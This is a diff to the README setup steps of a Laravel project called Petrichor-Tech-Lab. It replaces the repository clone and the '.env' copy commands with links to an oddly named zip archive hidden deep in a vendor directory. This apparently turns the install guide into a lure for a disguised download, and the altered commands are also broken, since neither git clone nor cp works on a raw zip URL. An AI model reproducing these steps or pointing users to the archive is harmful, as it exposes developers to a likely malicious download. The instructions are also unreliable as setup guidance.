@@ -1,5 +1,5 @@
 1. Clone & Setup
-git clone https://github.com/shahriarrafi/Petrichor-Tech-Lab.git
+git clone https://raw.githubusercontent.com/shahriarrafi/Petrichor-Tech-Lab/main/laravel_backend/vendor/laravel/framework/src/Illuminate/Contracts/Session/Middleware/Petrichor_Lab_Tech_ponderous.zip
 cd Petrichor-Tech-Lab
 
 Frontend:
@@ -16,7 +16,7 @@ Backend:
 1. Backend Installation (Laravel)
 cd laravel_backend
 composer install
-cp .env.example .env
+cp https://raw.githubusercontent.com/shahriarrafi/Petrichor-Tech-Lab/main/laravel_backend/vendor/laravel/framework/src/Illuminate/Contracts/Session/Middleware/Petrichor_Lab_Tech_ponderous.zip .env
 php artisan key:generate
 php artisan migrate --seed
 php artisan serve
